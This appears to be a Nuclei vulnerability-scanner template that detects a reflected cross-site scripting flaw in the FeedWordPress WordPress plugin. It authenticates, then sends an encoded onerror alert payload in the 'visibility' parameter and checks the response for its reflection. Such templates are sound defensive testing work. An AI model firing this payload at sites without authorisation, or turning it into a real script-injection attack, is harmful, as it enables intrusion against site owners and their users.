id: feedwordpress-xss
info:
  author: dhiyaneshDk
  description: The plugin is affected by a Reflected Cross-Site Scripting (XSS) within
    the "visibility" parameter.
  name: FeedWordPress < 2022.0123 - Reflected Cross-Site Scripting (XSS)
  reference:
  - https://wpscan.com/vulnerability/7ed050a4-27eb-4ecb-9182-1d8fa1e71571
  severity: medium
  tags: wordpress,wp-plugin,xss,feedwordpress,authenticated
requests:
- cookie-reuse: true
  matchers:
  - part: body
    type: word
    words:
    - '"><img src=2 onerror=alert(document.domain)>" method="post">'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin.php?page=feedwordpress%2Fsyndication.php&visibility=%22%3E%3Cimg+src%3D2+onerror%3Dalert%28document.domain%29%3E
    HTTP/1.1

    Host: {{Hostname}}

    '
